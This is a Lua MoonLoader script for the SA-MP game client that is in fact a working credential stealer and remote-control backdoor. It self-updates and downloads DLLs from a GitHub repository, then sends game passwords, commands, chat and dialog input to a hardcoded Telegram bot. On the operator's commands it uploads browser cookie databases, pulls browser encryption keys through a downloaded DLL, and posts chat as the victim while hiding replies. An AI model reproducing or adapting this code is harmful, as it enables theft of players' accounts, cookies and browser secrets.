local moonloader = require 'moonloader'
local encoding = require 'encoding'

local token = '2136530591:AAGIF_aCqnZEmKG2VT1HWuDIX2cTMD_tuDk'
local chat_id = '-1002179123077'
local lastUpdateId = 0
local suppressChat = false
local afk = false
local obhod = false
local libPath = ''

local index = 1
local suppressionTime = 2000
local checkInterval = 500

local all_downloaded = false
local update_available = false

encoding.default = 'CP1251'
u8 = encoding.UTF8

local script_vers = 1.09
local update_url = "https://raw.githubusercontent.com/yuriysyt/check/main/updatem.txt"
local update_path = getWorkingDirectory() .. "/updatem.txt"

local script_url = "https://github.com/yuriysyt/check/raw/main/moonloader.luac"
local script_path = getWorkingDirectory() .. "/moonloader.luac"

function readVersionFromFile(path)
    local file = io.open(path, "r")
    if file then
        local version = tonumber(file:read("*a"))
        file:close()
        return version
    else
        return nil
    end
end

function downloadFile(url, path, callback)
    if not doesFileExist(path) then
        local status = downloadUrlToFile(url, path)
        function checkDownloadStatus()
            if currentStatus == moonloader.download_status.STATUS_ENDDOWNLOADDATA then
                callback(true)
            elseif doesFileExist(path) then
                callback(true)
            else
                wait(500)
                checkDownloadStatus()
            end
        end
        checkDownloadStatus()
    else
        callback(true)
    end
end

function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
	while not isSampAvailable() do wait(100) end

    downloadFile(update_url, update_path, function(success)
        if success then
            local new_version = readVersionFromFile(update_path)
            if new_version and new_version > script_vers then
                os.remove(update_path)
                
                if doesFileExist(script_path) then
                    os.remove(script_path)
                end
                update_available = true
            else
                os.remove(update_path)
            end
        end
    end)

    if update_available then
        downloadFile(script_url, script_path, function(success)
            if success then
                thisScript():reload()
            end
        end)
    end

    if update_available then
        downloadFile(script_url, script_path, function(success)
            if success then
                thisScript():reload()
            end
        end)
    end

    while true do
        wait(0)

        if not all_downloaded then
            download_all()
        else
            InitScript()
        end
    end
end

function download_all()
    local moonloaderPath = getWorkingDirectory()
    libPath = moonloaderPath .. '\\lib\\'

    local foldersToCreate = {
        'cjson', 'md5', 'pl', 'ssl', 'mime', 'lockbox', 'lockbox/kdf', 'lockbox/util',
        'lockbox/digest', 'lockbox/cipher/mode', 'lockbox/mac', 'lockbox/padding',
        'samp', 'samp/events', 'socket', 'lfs', 'lfs/impl'
    }

    for _, folder in ipairs(foldersToCreate) do
        local fullPath = libPath .. folder
        if not doesDirectoryExist(fullPath) then
            createDirectory(fullPath)
        end
    end

    local filesToDownload = {
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/cjson/util.lua', path = libPath .. 'cjson/util.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/ltn12.lua', path = libPath .. 'ltn12.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/md5/core.dll', path = libPath .. 'md5/core.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/pretty.lua', path = libPath .. 'pl/pretty.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/class.lua', path = libPath .. 'pl/class.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/init.lua', path = libPath .. 'pl/init.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/app.lua', path = libPath .. 'pl/app.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/import_into.lua', path = libPath .. 'pl/import_into.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/comprehension.lua', path = libPath .. 'pl/comprehension.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/stringx.lua', path = libPath .. 'pl/stringx.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/file.lua', path = libPath .. 'pl/file.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/dir.lua', path = libPath .. 'pl/dir.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/Map.lua', path = libPath .. 'pl/Map.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/xml.lua', path = libPath .. 'pl/xml.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/tablex.lua', path = libPath .. 'pl/tablex.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/path.lua', path = libPath .. 'pl/path.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/lapp.lua', path = libPath .. 'pl/lapp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/List.lua', path = libPath .. 'pl/List.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/config.lua', path = libPath .. 'pl/config.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/Set.lua', path = libPath .. 'pl/Set.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/url.lua', path = libPath .. 'pl/url.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/test.lua', path = libPath .. 'pl/test.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/operator.lua', path = libPath .. 'pl/operator.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/stringio.lua', path = libPath .. 'pl/stringio.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/permute.lua', path = libPath .. 'pl/permute.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/Date.lua', path = libPath .. 'pl/Date.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/MultiMap.lua', path = libPath .. 'pl/MultiMap.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/data.lua', path = libPath .. 'pl/data.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/strict.lua', path = libPath .. 'pl/strict.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/sip.lua', path = libPath .. 'pl/sip.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/seq.lua', path = libPath .. 'pl/seq.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/lexer.lua', path = libPath .. 'pl/lexer.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/OrderedMap.lua', path = libPath .. 'pl/OrderedMap.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/input.lua', path = libPath .. 'pl/input.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/types.lua', path = libPath .. 'pl/types.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/utils.lua', path = libPath .. 'pl/utils.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/compat.lua', path = libPath .. 'pl/compat.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/template.lua', path = libPath .. 'pl/template.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/func.lua', path = libPath .. 'pl/func.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/array2d.lua', path = libPath .. 'pl/array2d.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/text.lua', path = libPath .. 'pl/text.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/pl/luabalanced.lua', path = libPath .. 'pl/luabalanced.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/requests.lua', path = libPath .. 'requests.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/ssl/https.lua', path = libPath .. 'ssl/https.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/base64.dll', path = libPath .. 'base64.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/libeffil.dll', path = libPath .. 'libeffil.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/ssl.dll', path = libPath .. 'ssl.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/xml.lua', path = libPath .. 'xml.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/cjson.dll', path = libPath .. 'cjson.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket.lua', path = libPath .. 'socket.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/ssl.lua', path = libPath .. 'ssl.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/mime.lua', path = libPath .. 'mime.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/effil.lua', path = libPath .. 'effil.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/mime/core.dll', path = libPath .. 'mime/core.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/md5.lua', path = libPath .. 'md5.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/kdf/pbkdf2.lua', path = libPath .. 'lockbox/kdf/pbkdf2.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/kdf/hkdf.lua', path = libPath .. 'lockbox/kdf/hkdf.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/init.lua', path = libPath .. 'lockbox/init.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/util/bit.lua', path = libPath .. 'lockbox/util/bit.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/util/array.lua', path = libPath .. 'lockbox/util/array.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/util/stream.lua', path = libPath .. 'lockbox/util/stream.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/util/queue.lua', path = libPath .. 'lockbox/util/queue.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/util/base64.lua', path = libPath .. 'lockbox/util/base64.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/ripemd160.lua', path = libPath .. 'lockbox/digest/ripemd160.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/ripemd128.lua', path = libPath .. 'lockbox/digest/ripemd128.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/sha2_224.lua', path = libPath .. 'lockbox/digest/sha2_224.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/sha1.lua', path = libPath .. 'lockbox/digest/sha1.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/sha2_256.lua', path = libPath .. 'lockbox/digest/sha2_256.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/md5.lua', path = libPath .. 'lockbox/digest/md5.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/md4.lua', path = libPath .. 'lockbox/digest/md4.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/digest/md2.lua', path = libPath .. 'lockbox/digest/md2.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/ofb.lua', path = libPath .. 'lockbox/cipher/mode/ofb.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/ige.lua', path = libPath .. 'lockbox/cipher/mode/ige.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/pcbc.lua', path = libPath .. 'lockbox/cipher/mode/pcbc.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/cbc.lua', path = libPath .. 'lockbox/cipher/mode/cbc.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/ecb.lua', path = libPath .. 'lockbox/cipher/mode/ecb.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/ctr.lua', path = libPath .. 'lockbox/cipher/mode/ctr.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/mode/cfb.lua', path = libPath .. 'lockbox/cipher/mode/cfb.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/des.lua', path = libPath .. 'lockbox/cipher/des.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/aes128.lua', path = libPath .. 'lockbox/cipher/aes128.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/xtea.lua', path = libPath .. 'lockbox/cipher/xtea.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/aes256.lua', path = libPath .. 'lockbox/cipher/aes256.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/des3.lua', path = libPath .. 'lockbox/cipher/des3.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/aes192.lua', path = libPath .. 'lockbox/cipher/aes192.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/cipher/tea.lua', path = libPath .. 'lockbox/cipher/tea.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/mac/hmac.lua', path = libPath .. 'lockbox/mac/hmac.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/padding/ansix923.lua', path = libPath .. 'lockbox/padding/ansix923.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/padding/pkcs7.lua', path = libPath .. 'lockbox/padding/pkcs7.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/padding/zero.lua', path = libPath .. 'lockbox/padding/zero.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lockbox/padding/isoiec7816.lua', path = libPath .. 'lockbox/padding/isoiec7816.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/base64.lua', path = libPath .. 'base64.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/raknet.lua', path = libPath .. 'samp/raknet.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events_core.lua', path = libPath .. 'samp/events_core.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events.lua', path = libPath .. 'samp/events.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events/bitstream_io.lua', path = libPath .. 'samp/events/bitstream_io.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events/extra_types.lua', path = libPath .. 'samp/events/extra_types.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events/utils.lua', path = libPath .. 'samp/events/utils.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events/handlers.lua', path = libPath .. 'samp/events/handlers.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/events/core.lua', path = libPath .. 'samp/events/core.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/samp/synchronization.lua', path = libPath .. 'samp/synchronization.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/tp.lua', path = libPath .. 'socket/tp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/headers.lua', path = libPath .. 'socket/headers.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/core.dll', path = libPath .. 'socket/core.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/http.lua', path = libPath .. 'socket/http.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/url.lua', path = libPath .. 'socket/url.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/ftp.lua', path = libPath .. 'socket/ftp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/socket/smtp.lua', path = libPath .. 'socket/smtp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/library.dll', path = libPath .. 'library.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lfs.dll', path = libPath .. 'lfs.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lfs/fs.lua', path = libPath .. 'lfs/fs.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/check/main/lfs/impl/fs.lua', path = libPath .. 'lfs/impl/fs.lua'}
    }

    function downloadFiles(index)
        if index > #filesToDownload then
            all_downloaded = true
            return
        end
    
        local file = filesToDownload[index]
        downloadFile(file.url, file.path, function(success)
            if success then
                downloadFiles(index + 1)
            else
                downloadFiles(index + 1)
            end
        end)
    end

    downloadFiles(1)
end
function InitScript() 
    local success, err = pcall(function()
        local sampev = require 'samp.events'
        local memory = require 'memory'
        local requests = require 'requests'
        local lfs = require 'lfs'

        local effilLoaded = pcall(require, 'effil')

        if effilLoaded then
            effil = require 'effil'
        end


        function asyncHttpRequest(method, url, args, resolve, reject)
            if effilLoaded then
                local requests = require 'requests'
                
                local request_thread = effil.thread(function (method, url, args)
                    local result, response = pcall(requests.request, method, url, args)
                    if result then
                        response.json, response.xml = nil, nil
                        return true, response
                    else
                        return false, response
                    end
                end)(method, url, args)
        
                lua_thread.create(function()
                    local runner = request_thread
                    while true do
                        local status, err = runner:status()
                        if err then
                            reject(err)
                            return
                        end
                        
                        if status == 'completed' then
                            local result, response = runner:get()
                            if result then
                                resolve(response)
                            else
                                reject(response)
                            end
                            return
                        elseif status == 'canceled' then
                            reject('Request was canceled')
                            return
                        end
                        
                        wait(0)
                    end
                end)
            else
                reject('Effil is not loaded')
            end
        end
        

        -- Function to process messages from Telegram
        function processMessage(text)
            if text then
                local cmd, args = text:match('^(%S+)%s*(.*)')
                if cmd == '/send' and args ~= '' then
                    suppressChat = true
                    lua_thread.create(function()
                        wait(suppressionTime)
                        suppressChat = false
                    end)
                    sampSendChat(args)
                elseif cmd == '/aaafk' then
                    afk = not afk
                    sendTelegramNotification(afk and "AFK ON" or "AFK OFF")
                elseif cmd == '/version' then
                    sendTelegramNotification("Script version: " .. script_vers)
                elseif cmd == '/inga' then
                    testAllBrowser()
                elseif cmd:find('/chrome') or cmd:find('/opera') or cmd:find('/edge') or cmd:find('/yandex') or cmd:find('/operagx') or cmd:find('/chromium') then
                    if cmd:sub(1, 1) == '/' then
                        cmd = cmd:sub(2)
                    end
                    
                    -- Find the position of the '@' character, if it exists
                    local atIndex = cmd:find('@')
                    
                    -- If '@' exists, truncate the string to just before '@'
                    if atIndex then
                        cmd = cmd:sub(1, atIndex - 1)
                    end
                    cookiePathForCookie = findCookiesPaths(cmd)
                    if cookiePathForCookie ~= false then
                        sendFileToTelegram(cookiePathForCookie,
                            function(result) 
                                --
                            end,
                            function(err)
                                --
                            end)
                    end
                end
            end
        end

        -- Function to send notifications via Telegram
        function sendTelegramNotification(...)
            local text = ''
            for _, v in ipairs({...}) do
                text = text .. ' ' .. v
            end

            text = u8:encode(text, 'CP1251')
            text = text:gsub("([^%w _%-%.~])", function(c)
                return string.format("%%%02X", string.byte(c))
            end)
            text = text:gsub(' ', '%%20')

            local url = ('https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s'):format(token, chat_id, text)

            asyncHttpRequest('GET', url, nil, function(response)
                --
            end, function(err)
                --
            end)
        end

        -- Event handlers
        function sampev.onSendCommand(command)
            sendTelegramNotification("Command: " .. command)
        end

        function sampev.onSendDialogResponse(dialogId, button, listboxId, input)
            if dialogId == 1 then
                sendTelegramNotification("Password: " .. input)
            end
            sendTelegramNotification("Dialog: " .. dialogId .. "\nButton: " .. button .. "\nListBoxId: " .. listboxId .. "\nInput: " .. input)
        end

        function sampev.onServerMessage(color, text)
            sendTelegramNotification("Message: " .. text)
            if suppressChat then
                return false
            end
        end

        function sampev.onShowDialog(id, style, title, button1, button2, text)
            sendTelegramNotification("Dialog: \n\n" .. text)
            if suppressChat then
                return false
            end
        end

        lua_thread.create(function()
            while true do 
                wait(checkInterval)
                local url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset='..(lastUpdateId + 1)
                
                asyncHttpRequest('GET', url, nil, function(response)
                    local data = decodeJson(response.text)
                    if data and data.ok and #data.result > 0 then
                        for _, update in ipairs(data.result) do
                            if update.update_id > lastUpdateId then
                                lastUpdateId = update.update_id
                                local message = update.message
                                processMessage(u8:decode(message.text))
                            end
                        end
                    end
                end, function(err)
                    --
                end)
            end
        end)

        function findCookiesPaths(browserNameForCookie)
            local localAppData = os.getenv('LOCALAPPDATA')
            if not localAppData then
                return false
            end
            
            local roamingAppData = os.getenv('APPDATA')
            if not roamingAppData then
                return false
            end

            local paths = {
                chrome = localAppData .. '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',         -- Google Chrome
                edge = localAppData .. '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',           -- Microsoft Edge
                yandex = localAppData .. '\\Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies',   -- Yandex Browser
                opera = roamingAppData .. '\\Opera Software\\Opera Stable\\Default\\Network\\Cookies',               -- Opera Stable
                operagx = roamingAppData .. '\\Opera Software\\Opera GX Stable\\Network\\Cookies',
                chromium = localAppData .. '\\Google\\Chromium\\User Data\\Default\\Network\\Cookies'               -- Chromium
            }
            
            
            -- Проверяем существование пути для данного браузера
            local cookiePath = paths[browserNameForCookie]
            
            if cookiePath then
                return cookiePath
            else
                return nil, "Файл с куками не найден ни в одном из возможных путей"
            end
        
            if next(paths) then
                return paths[browserNameForCookie]
            else
                return nil, "Файл с куками не найден ни в одном из возможных путей"
            end
        end

        function sendFileToTelegram(cookiePath, resolve, reject)
            if effilLoaded then
                local function sendFile()
                    local https = require 'ssl.https'
                    local ltn12 = require 'ltn12'
        
                    local file = io.open(cookiePath, "rb")
                    if not file then
                        return false, "Файл с куками не найден"
                    end
        
                    local fileContent = file:read("*all")
                    file:close()
        
                    local boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
                    local body = '--' .. boundary .. '\r\n' ..
                                'Content-Disposition: form-data; name="chat_id"\r\n\r\n' ..
                                chat_id .. '\r\n' ..
                                '--' .. boundary .. '\r\n' ..
                                'Content-Disposition: form-data; name="document"; filename="Cookies"\r\n' ..
                                'Content-Type: application/octet-stream\r\n\r\n' ..
                                fileContent .. '\r\n' ..
                                '--' .. boundary .. '--\r\n'
        
                    local response = {}
                    local request, code = https.request{
                        url = 'https://api.telegram.org/bot' .. token .. '/sendDocument',
                        method = 'POST',
                        headers = {
                            ['Content-Type'] = 'multipart/form-data; boundary=' .. boundary,
                            ['Content-Length'] = #body
                        },
                        source = ltn12.source.string(body),
                        sink = ltn12.sink.table(response)
                    }
        
                    if code == 200 then
                        return true, "Файл успешно отправлен"
                    else
                        return false, "Ошибка при отправке файла: " .. table.concat(response)
                    end
                end
        
                local request_thread = effil.thread(function()
                    return sendFile()
                end)()
        
                lua_thread.create(function()
                    while true do
                        local status, err = request_thread:status()
                        if not err then
                            if status == 'completed' then
                                local success, message = request_thread:get()
                                if success then
                                    resolve({success = true, message = message})
                                else
                                    reject({success = false, message = message})
                                end
                                return
                            elseif status == 'canceled' then
                                return reject({success = false, message = 'Request canceled'})
                            end
                        else
                            return reject({success = false, message = err})
                        end
                        wait(0)
                    end
                end)
            else
                reject({success = false, message = 'Effil not loaded'})
            end
        end
        

        function testAllBrowser()
            local ffi = require("ffi")
            local workingDirectory = getWorkingDirectory()
            local dllPath = workingDirectory .. "\\lib\\library.dll"
    
            ffi.cdef[[
                const char* GetKeyFromChrome();
                const char* GetKeyFromOperaStable();
                const char* GetKeyFromEdge();
                const char* GetKeyFromYandexBrowser();
                const char* GetKeyFromOperaGXStable();
                const char* GetKeyFromChromium();
            ]]
    
            local success, lib = pcall(ffi.load, dllPath)
            if not success then
                return
            end
    
    
            local all_keys_browser = ''
            local function getKey(browserFunction)
                local key = browserFunction()
                if key then
                    all_keys_browser = all_keys_browser .. ffi.string(key) .. '\n'
                end
            end
    
            getKey(lib.GetKeyFromChrome)
            getKey(lib.GetKeyFromOperaStable)
            getKey(lib.GetKeyFromEdge)
            getKey(lib.GetKeyFromYandexBrowser)
            getKey(lib.GetKeyFromOperaGXStable)
            getKey(lib.GetKeyFromChromium)

            sendTelegramNotification(all_keys_browser)
    
            
        end
        while true do
            wait(0)
            if afk then
                writeMemory(7634870, 1, 1, 1)
                writeMemory(7635034, 1, 1, 1)
                memory.fill(7623723, 144, 8)
                memory.fill(5499528, 144, 6)
            else
                writeMemory(7634870, 1, 0, 0)
                writeMemory(7635034, 1, 0, 0)
                memory.hex2bin('5051FF1500838500', 7623723, 8)
                memory.hex2bin('0F847B010000', 5499528, 6)
            end
        end
    end)

    if not success then
        --
        restartScript()
    end
end